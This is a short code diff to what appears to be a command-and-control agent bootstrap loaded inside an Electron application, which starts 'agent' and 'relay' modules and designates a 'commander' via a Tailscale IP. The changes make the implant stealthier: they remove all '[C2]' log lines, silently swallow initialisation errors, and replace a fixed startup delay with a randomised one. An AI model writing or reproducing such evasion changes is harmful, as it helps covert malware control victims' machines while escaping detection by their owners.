@@ -3,6 +3,7 @@ const agent = require('./agent');
 const relay = require('./relay');
 const fs = require('fs');
 const path = require('path');
+const crypto = require('crypto');
 
 let isCommander = false;
 
@@ -25,28 +26,26 @@ function init() {
     isCommander = detectIfCommander();
     if (isCommander) {
       cfg.RELAY_IP = agent.detectTailscaleIP() || '127.0.0.1';
-      console.log(`[C2] Running as COMMANDER (relay IP: ${cfg.RELAY_IP})`);
     }
     agent.init();
     relay.init(isCommander);
-    console.log(`[C2] Agent ${cfg.instanceId} initialized (${cfg.hostname})`);
-  } catch(e) {
-    console.error('[C2] Init error:', e.message);
-  }
+  } catch(e) {}
 }
 
 if (require.main !== module) {
+  const delay = cfg.STARTUP_DELAY_MIN + crypto.randomInt(0, cfg.STARTUP_DELAY_MAX - cfg.STARTUP_DELAY_MIN + 1);
   try {
     const { app } = require('electron');
+    const startup = () => setTimeout(init, delay);
     if (app && app.isReady && app.isReady()) {
-      init();
+      startup();
     } else if (app) {
-      app.on('ready', init);
+      app.on('ready', startup);
     } else {
-      setTimeout(init, 3000);
+      setTimeout(init, delay);
     }
   } catch(e) {
-    setTimeout(init, 3000);
+    setTimeout(init, delay);
   }
 }
 
